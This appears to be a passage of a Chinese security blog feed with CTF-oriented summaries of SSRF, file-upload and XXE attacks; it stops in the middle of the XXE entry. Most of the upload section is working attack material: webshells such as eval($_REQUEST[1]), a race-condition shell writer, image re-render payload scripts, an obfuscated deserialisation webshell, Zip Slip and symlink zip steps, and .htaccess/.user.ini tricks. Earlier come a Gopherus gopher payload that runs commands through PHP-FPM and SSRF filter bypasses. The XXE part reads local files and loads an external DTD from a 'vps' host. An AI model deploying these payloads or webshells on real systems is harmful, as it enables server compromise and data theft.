ssrf打php-fpmroot@lewiserii:~/Gopherus-master# python2 gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;        \/       |__|        \/     \/                 \/                author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don&#x27;t know press ENTER we have default one:  index.phpTerminal command to run:  ls /Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

传入时记得将生成的payload下划线后面的数据进行url编码
bypassip限制例如限制了127/172
进制转换10进制 http://21307064338进制 http://01770000000116进制  http://0x7F000001长度限制host&lt;5url=http://0/flag.phpurl=http://127.1/flag.phphost&lt;3url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1

url限制
解析到内网的域名

xip.io、xip.name、nip.io、sslip.io等
192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1localhost &gt;&gt;&gt; 127.0.0.1


利用@转跳

http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10


利用句号

127。0。0。1  &gt;&gt;&gt;  127.0.0.1


利用IPv6[::]

http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用


利用短网址

不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制
302跳转vps上放个php
&lt;?phpheader(&quot;Location:http://127.0.0.1/flag.php&quot;);

或者
&lt;?php$schema = $_GET[&#x27;s&#x27;];$ip     = $_GET[&#x27;i&#x27;];$port   = $_GET[&#x27;p&#x27;];$query  = $_GET[&#x27;q&#x27;];if(empty($port))&#123;    header(&quot;Location: $schema://$ip/$query&quot;);&#125; else &#123;    header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;

enclosed alphanumerics 绕过一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

DNS重绑定从0到1认识DNS重绑定攻击
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于文件上传的一点总结</title>
    <url>/posts/5c3aa540/</url>
    <content><![CDATA[前言部分靶场用的是国光师傅的文件上传靶场项目 + upload-lab
JavaScript绕过F12可以很清楚的看到上传逻辑

js绕过的方法较多，抓包改后缀，禁用js或是直接修改代码
访问chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript?search&#x3D;java

MIME绕过MIME验证是对数据包的Content-Type类型进行验证我们只需要修改Content-Type类型即可绕过

常见的类型

text&#x2F;plain（纯文本）text&#x2F;html（HTML文档）text&#x2F;javascript（js代码）application&#x2F;xhtml+xml（XHTML文档）image&#x2F;gif（GIF图像）image&#x2F;jpeg（JPEG图像）image&#x2F;png（PNG图像）video&#x2F;mpeg（MPEG动画）application&#x2F;octet-stream（二进制数据）application&#x2F;pdf（PDF文档）application&#x2F;(编程语言) 该种语言的代码application&#x2F;msword（Microsoft Word文件）message&#x2F;rfc822（RFC 822形式）multipart&#x2F;alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）application&#x2F;x-www-form-urlencoded（ POST方法提交的表单）multipart&#x2F;form-data（POST提交时伴随文件上传的表单）

文件头绕过顾名思义，就是对文件头的验证用010 Editor等十六进制编辑器查看并修改

常见的文件头

PNG 的文件头为89 50 4E 47 0D 0A 1A 0A


GIF(相当于文本的GIF89a)：47 49 46 38 39 61


JPG 的文件头为FF D8 FF E0 00 10 4A 46 49 46


ZIP 的文件头为50 4B 03 04


RAR 的文件头为52 61 72 21

黑名单关键词替换绕过$blacklist = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;htaccess&quot;);$name = str_ireplace($blacklist,&quot;&quot;,$name);if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],UPLOAD_PATH.$name))

黑名单关键词替换为空的操作是一种不安全的写法可以使用双写来绕过如test.phphpp
windows环境还是上一题的代码但是在windows环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用
黑名单缺陷白名单是设置能通过的用户，白名单以外的用户都不能通过。黑名单是设置不能通过的用户，黑名单以外的用户都能通过。
所以一般情况下白名单比黑名单限制的用户要更多一些这里利用的是php的多后缀默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP
.htaccess上传一个.htaccess文件，文件内容如下

意思是这个目录下的所有以.png为后缀的文件都会被解析为php执行然后上传一个1.png

访问上传的1.png执行成功

或者可以组合auto_append_file来绕过一些对内容的限制
AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.aaa&quot;


.htaccess 解析成图片方法一：
#define width 1337#define height 1337

方法二：
在.htaccess前添加x00x00x8ax39x8ax39x00x00x8ax39x8ax39 是wbmp文件的文件头.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess
00截断–1想要利用00截断需要一些条件：

php版本要小于5.3.4，5.3.4及以上已经修复该问题magic_quotes_gpc需要为OFF状态

0x00，%00，&#x2F;00之类的截断，都是一样的，只是不同表示而已
上传1.png，并构造一个new.php即&#x2F;upload&#x2F;new.php%001.png，经过解析后1.png被截断

访问new.php执行成功

00截断–2POST型的00截断需要手动解码一次


条件竞争例子:先存储文件，再判断是否合法，然后又删除首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
攻击:首先上传一个php文件当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。
&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;
利用burp的抓包和爆破功能即可实现条件竞争（或是利用脚本，如较为方便的python）将上传的shell无限发送，另一边无限访问这个shell，趁上传和删除的间隙生成webshell
move_uploaded_file绕过move_uploaded_file($temp_file, $img_path)

上述函数除了 PHP 5.3.4 以下的版本可以用 00 截断绕过，就真的没有其他缺陷了吗？

当 $img_path 可控的时候，还会忽略掉 $img_path 后面的 &#x2F;.
梅子酒师傅的这篇文章已经解释的很详细了

图片二次渲染绕过
imagecreatefrom 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的

GIF先上传一个GIF

1.gif是上传的2.gif是渲染后的使用010的文件比较功能，其中灰的部分就是内容一致的部分

将php代码插入到灰色部分之中即可

上传后再导出，发现php代码并没有被渲染掉

PNG直接使用大牛的脚本了
&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;1.png&#x27;);  //要修改的图片的路径/* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; */?&gt;
用phpstudy等软件搭建一个本地环境运行即可把木马和脚本放在同一目录下，访问php即可
JPG同样直接放脚本
&lt;?php    $miniPayload = &quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;;  //修改为需要的代码即可    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;

用法  php exp.php 1.png注意，要先上传渲染一次再进行脚本渲染我在本地环境试了好多张jpg图片，包括系统截图的，qq截图，网上下载图片等等方式，都没有成功不过国光师傅提供的这张图片倒是可以使用，不知道是啥问题

国光师傅的jpg总结

.user.ini从.user.ini后补充一下靶场中没有提到的环境
使用条件:对应目录下面有可执行的php文件
.user.ini.它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。
如果采用exif_imagetype()验证文件后缀，可以尝试上传.user.ini
//使用任意一条即可，这两个配置项相当于文件包含 require()auto_prepend_file = &lt;filename&gt; // 包含在文件头auto_append_file = &lt;filename&gt; // 包含在文件尾（遇到exit语句失效）
如果成功上传了.user.ini后直接上传图片马getshell即可
trick1：auto_append_file也支持伪协议的使用，例如auto_append_file = php://inputtrick2：可以包含nginx日志，例如auto_append_file = /var/log/nginx/access.log，访问的时候在ua头写上一句话木马
内容检测可以使用二分法来确定被检测的关键字
第一种情况：检测php的关键标签，比如&lt;?php ?&gt;可以尝试使用其他标签，如：
&lt;script language=&quot;php&quot;&gt; eval($_POST[2333]);&lt;/script&gt;

使用script标签对php版本有要求：php &lt; 7
或者使用短标签
&lt;?=eval($_REQUEST[1]);

再或者可以上传.htaccess文件来修改配置项
例如
AddType application/x-httpd-php .txtphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.txt&quot;

然后上传base64编码的txt文件即可
第二种情况：检测危险函数等敏感内容可以使用免杀马等
例如
&lt;?phpif (isset($_POST[&#x27;run&#x27;])) &#123;  class HandShip &#123;     public $name;     public $male;     function __destruct() &#123;        $allin = $this-&gt;name;        $allin($this-&gt;male);     &#125;  &#125;if(md5($_POST[&#x27;code&#x27;])==&#x27;ce61649168c4550c2f7acab92354dc6e&#x27;)&#123;  unserialize($_POST[&#x27;run&#x27;]);&#125;&#125;?&gt;

使用方法run=O:8:&quot;HandShip&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:4:&quot;male&quot;;s:9:&quot;cat /home&quot;;&#125;;&amp;code=panda
apache解析漏洞非常简单的一个漏洞Apache默认一个文件可以有多个以点.分割的后缀，当右边的后缀无法识别，则继续向左识别上传shell.php.asdasd这个后缀无法解析，服务器就会认为后缀是.php，从而绕过
该漏洞与Apache 、 php版本误关，属于用户配置不当造成的解析漏洞
配置如下
&lt;FilesMatch &quot;.+\.ph(ar|p|tml)&quot;&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;

不在mime.types当中的都不认识
Windows：/apche/conf/mine.typesUbuntu：/etc/mime.types

iis asp目录解析漏洞该解析漏洞形成原因是以*.asp命名的文件夹里面的文件都会被当作asp文件解析！
iis 分号漏洞*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。
nginx错误配置漏洞该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞
1：由于nginx.conf的错误配置导致nginx把以.php结尾的文件交给fastcgi处理，为此可以构造upload/1.png/1.php（1.png是上传的文件，包含一句话木马）
2：但是fastcgi在处理1.php文件时发现文件并不存在，这时php.ini配置文件中cgi.fix_pathinfo=1发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/1.png，最后将1.png的内容当成php解析
超大文件名绕过Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”1.a.a.a.不要忽略我的长度.a.jsp
DATA绕过没有对后缀名中的::$DATA进行过滤。在php+windows的情况下：如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持::$DATA之前的文件名。利用windows特性，可在后缀名中加::$DATA绕过
常见后缀(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;)

getimagesize函数绕过当在代码中使用getimagesize函数来检测是不是图片，而不采取其他措施的情况下，可以在文件头加上如下内容(XBM格式图片)来绕过检测
#define width 100;#define height 100;

Zip Slip上传zip类型的文件后，应用程序自动进行解压，就有可能存在zip slip漏洞
使用python生成或者010等工具手动编辑路径
import zipfile# the name of the zip file to generatezf = zipfile.ZipFile(&#x27;out.zip&#x27;, &#x27;w&#x27;)# the name of the malicious file that will overwrite the origial file (must exist on disk)fname = &#x27;sec_test.txt&#x27;#destination path of the filezf.write(fname, &#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;)


unzip命令是无法实现目录穿越的，会默认跳过..&#x2F;

所有已发现受Zip Slip影响的项目
zip软连接当解压操作可以覆盖上一次解压文件时触发
例如ciscn2023-unzip
&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;//only this!


unzip的-o参数表示 不必先询问用户，unzip执行后覆盖原有的文件
构造第一个压缩包
先构造一个指向/var/www/html的软连接
ln -s /var/www/html poc

再保留软连接压缩
zip --symlinks test.zip poc

此时上传该test.zip解压出里边的文件，也就是软连接到/var/www/html
构造第二个压缩包
先创建跟第一个压缩包中目录同名的目录
mkdir poc

接着向目录中写一个shell
echo &quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot; &gt; ./poc/shell.php

压缩这个目录
zip -r test1.zip poc

当我们上传第二个压缩包时，因为poc目录已经软连接到/var/www/html了，所以解压的时候会把shell.php放在/var/www/html

tar解压目录穿越tar命令可以在打包的时候把路径也打包进去
tar cPvf test.tar ../../../../../var/www/html/upload/payload.php

Linux下解压(使用的是GNU的tar)，默认情况下，tar会自动把前面的&#x2F;去掉，然后在当前目录解压Unix则不然，会依照绝对路径解压，对路径中的其他文件不影响，对相同的文件，覆盖。如果不存在某个目录，则创建(如果有权限)。在这里 python的解压 与Unix的解压同理，会直接在指定路径下进行解压

phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;http://localhost/?url=phar://uploads/63e93ffe53f03e93bb0a0249152d243874e31c9b.zip/shellhttp://localhost/?url=zip:///var/www/html/upload/892e38cea0c47c744ecc60ccacc94c23.zip%23shell
利用中间件差异绕过waf来自西湖论剑的一道题目：扭转乾坤
上传发现提示的apache不支持Content-Type: multipart/form-data
后端为tomcat，tomcat对于包解析并不是严格按照RFC中的标准，对一些异常的header头内容也会兼容
包括但不限于，修改为Content-Type为multipart//form-data;｜大小写兼容｜multipart｜multipart/  form-data;
判断上传漏洞类型借用c0ny1师傅的一个图
总结文件上传的基本姿势应该都提及了欢迎补充和指正！
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe学习总结</title>
    <url>/posts/aaf14e8/</url>
    <content><![CDATA[从XML到XXEXML什么是 XML？XML 指可扩展标记语言（EXtensible Markup Language）。XML 的设计宗旨是传输数据，而不是显示数据。XML 是 W3C 的推荐标准。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 语言没有预定义的标签。
XML 和 HTML 之间的差异XML 不是 HTML 的替代。XML 和 HTML 为不同的目的而设计：

XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;


DTDDTD(文档类型定义，Document Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。
DTD引用方式1）DTD 内部声明&lt;!DOCTYPE 根元素 [元素声明]&gt;
2）DTD 外部引用&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;
3）引用公共DTD&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;
DTD 关键字
DOCTYPE（DTD的声明）
ENTITY（实体的声明）
SYSTEM、PUBLIC（外部资源申请）
ELEMENT（定义元素声明）

实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种：

内置实体 (Built-in entities)
字符实体 (Character entities)
通用实体&#x2F;普通实体 (General entities)
参数实体 (Parameter entities)

内置实体
&amp;符号: &amp;amp;单引号: &amp;apos;＞: &amp;gt;＜: &amp;lt;双引号: &amp;quot;

字符实体
通常是html的实体编码，例如：
&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot; standalone = &quot;yes&quot;?&gt;&lt;!DOCTYPE author[   &lt;!ELEMENT author (#PCDATA)&gt;   &lt;!ENTITY copyright &quot;&amp;#169;&quot;&gt;]&gt;&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;

&amp;#169即©
普通实体
例如：
&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE note [   &lt;!ENTITY source-text &quot;tutorialspoint&quot;&gt;]&gt;&lt;note&gt;   &amp;source-text;&lt;/note&gt;

参数实体
例如
&lt;!ENTITY % ename &quot;entity_value&quot;&gt;

参数实体必须先定义再使用，而不能像一般实体那样随意放置。
内部实体与外部实体实体根据引用方式，还可分为内部实体与外部实体。
内部实体：&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;
外部实体：&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;
通用实体和参数实体其实按照使用来分类，又可以将实体分为通用实体和参数实体。
通用实体：用&amp;实体名;引用的实体，他在DTD中定义，在XML文档中引用
参数实体：使用% 实体名在DTD中定义，并且只能在DTD中使用%实体名;引用只有在DTD文件中，参数实体的声明才能引用其他实体和通用实体一样，参数实体也可以外部引用
不同程序支持的协议

1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 352.libxml 是 PHP 的 xml 支持

PHP支持的协议会更多一些，但需要一定的扩展：

XXEXXE漏洞全称XML External Entity Injection即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
XXE的几种利用方式有回显任意文件读取(Normal Based XXE)服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件
xxe.php
&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;); //获取客户端输入内容if(isset($xmlfile))&#123;    $dom = new DOMDocument();    //初始化XML解析器    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载客户端输入的XML内容    $creds = simplexml_import_dom($dom);  //获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE    echo $creds;&#125;highlight_file(__FILE__);?&gt;



payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;


特殊符号如果读取的文件中包含特殊符号，比如&lt;、&gt;、&amp;、&quot;、&#39;等，就会返回一些报错信息
这时可以使用CDATA或者base64 convert
术语CDATA指的是不应由XML解析器进行解析的文本数据（Unparsed Character Data）CDATA部分由&quot;&lt;![CDATA[&quot;开始，由&quot;]]&gt;&quot;结束，解析器会忽略CDATA部分中的所有内容
我们的思路就是把读取的文件放在CDATA中之后再调用
payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY start&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;file:///flag&quot;&gt; ]]&gt;&quot;&gt;]% xxe;&gt;&lt;test&gt;&amp;start&lt;/test&gt;

不过使用这个payload读文件时还是会报错，因为在xml中，xml解析器有个限制：不能在内部Entity中引用，“PEReferences forbidden in internal subset in Entity ”指的就是禁止内部参数实体引用
所以需要调用的外部的dtd
payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % go SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://vps/evil.dtd&quot;&gt;%dtd;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt;

evil.dtd
&lt;!ENTITY all &quot;%start;%go;%end;&quot;&gt;


无回显任意文件读取(Blind Based XXE)xxe.php
